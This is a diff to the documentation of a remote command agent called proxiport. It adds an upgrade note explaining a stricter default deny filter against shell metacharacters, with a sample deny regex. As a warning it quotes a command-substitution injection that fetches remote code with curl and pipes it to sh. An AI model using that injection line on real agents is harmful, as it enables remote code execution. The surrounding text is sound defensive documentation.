@@ -170,6 +170,42 @@ practical consequences:
     runs an operator-chosen interpreter and skips the allow/deny check
     entirely, which is what `[remote-scripts] enabled` gates.
 
+### Upgrading — the default `deny` changed in 0.8.9
+
+`$`, backtick, `(`, `)`, `{` and `}` were added to the shipped default.
+**This only affects agents that never set `deny` themselves** — an
+explicit `deny` in `proxiport.conf` is used as written and is not
+touched by an upgrade.
+
+If you relied on the old default, commands that used a shell variable
+or parentheses will now be rejected on that agent, for example:
+
+```
+/usr/bin/df -h $HOME
+/usr/bin/systemctl show proxiport --property=(MainPID)
+```
+
+You have three options, in the order they are worth considering:
+
+1. **Send an absolute, literal command.** `$HOME` expanded on the
+   agent was never predictable from the operator's side anyway —
+   `/usr/bin/df -h /home/someone` says what it means.
+2. **Move the work into a [script](scripts.md).** Scripts are the
+   supported way to run anything with shell structure in it; the
+   allow/deny filter does not apply to them, and `[remote-scripts]
+   enabled` is the switch that governs them.
+3. **Set `deny` explicitly** to the old value if you have decided the
+   risk is acceptable on that host:
+
+    ```toml
+    [remote-commands]
+      deny = ['(\||<|>|;|,|\n|&)']
+    ```
+
+    Do this knowing what it allows: with the default `allow` of
+    `^/usr/bin/.*`, `/usr/bin/env $(curl http://host/x|sh)` passes the
+    filter and runs whatever the substitution fetches.
+
 ### Order semantics
 
 `order = ['allow', 'deny']` (the default):
